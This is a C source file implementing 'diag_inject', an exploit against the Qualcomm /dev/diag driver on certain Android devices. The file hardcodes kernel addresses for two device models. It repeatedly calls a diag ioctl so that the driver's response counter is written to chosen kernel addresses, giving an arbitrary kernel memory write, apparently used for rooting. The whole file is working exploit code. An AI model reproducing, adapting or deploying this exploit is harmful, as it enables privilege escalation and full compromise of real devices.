/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>

#include "diag.h"
#include "device.h"

typedef struct _supported_device {
  DeviceId device;
  unsigned long int delayed_rsp_id_address;
} supported_device;

static supported_device supported_devices[] = {
  { F03D_V24, 0xc0777dd0 },
  { F12C_V21, 0xc075aca4 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static void *
get_delayed_rsp_id_addresses(DeviceId device)
{
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device == device) {
      return (void*)supported_devices[i].delayed_rsp_id_address;
    }
  }

  return NULL;
}

#define DIAG_IOCTL_GET_DELAYED_RSP_ID   8
struct diagpkt_delay_params {
  void *rsp_ptr;
  int size;
  int *num_bytes_ptr;
};

static int
send_delay_params(int fd, void *target_address, void *stored_for_written_bytes)
{
  int ret;
  struct diagpkt_delay_params params;

  params.rsp_ptr = target_address;
  params.size = 2;
  params.num_bytes_ptr = stored_for_written_bytes;

  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &params);
  if (ret < 0) {
    printf("failed to ioctl due to %s.\n", strerror(errno));
  }
  return ret;
}

static int
reset_delayed_rsp_id(int fd, void *delayed_rsp_id_address)
{
  uint16_t unused;

  return send_delay_params(fd, &unused, delayed_rsp_id_address);
}

static int
get_current_delayed_rsp_id(int fd)
{
  int ret;
  uint16_t delayed_rsp_id = 0;
  int unused;

  ret = send_delay_params(fd, &delayed_rsp_id, &unused);
  if (ret < 0) {
    return ret;
  }
  return delayed_rsp_id;
}

static bool
inject_value (unsigned int target_address, int value,
              int fd, void *delayed_rsp_id_address)
{
  uint16_t delayed_rsp_id_value = 0;
  int i, loop_count, ret;

  if (reset_delayed_rsp_id(fd, delayed_rsp_id_address) < 0) {
    return false;
  }

  ret = get_current_delayed_rsp_id(fd);
  if (ret < 0) {
    return false;
  }
  delayed_rsp_id_value = ret;

  loop_count = (value - delayed_rsp_id_value) & 0xffff;

  for (i = 0; i < loop_count; i++) {
    int unused;
    if (send_delay_params(fd, (void *)target_address, &unused) < 0) {
      return false;
    }
  }
  return true;
}

bool
diag_inject(struct values *data, int data_length)
{
  int fd;
  int i;
  void *delayed_rsp_id_address;
  DeviceId device;

  device = detect_device();
  if (device == UNSUPPORTED) {
    return false;
  }

  delayed_rsp_id_address = get_delayed_rsp_id_addresses(device);
  if (!delayed_rsp_id_address) {
    return false;
  }

  fd = open("/dev/diag", O_RDWR);
  if (fd < 0) {
    printf("failed to open /dev/diag due to %s.", strerror(errno));
    return false;
  }

  for (i = 0; i < data_length; i++) {
    if (!inject_value(data[i].address, data[i].value, fd, delayed_rsp_id_address)) {
      close(fd);
      return false;
    }
  }

  close(fd);

  return true;
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
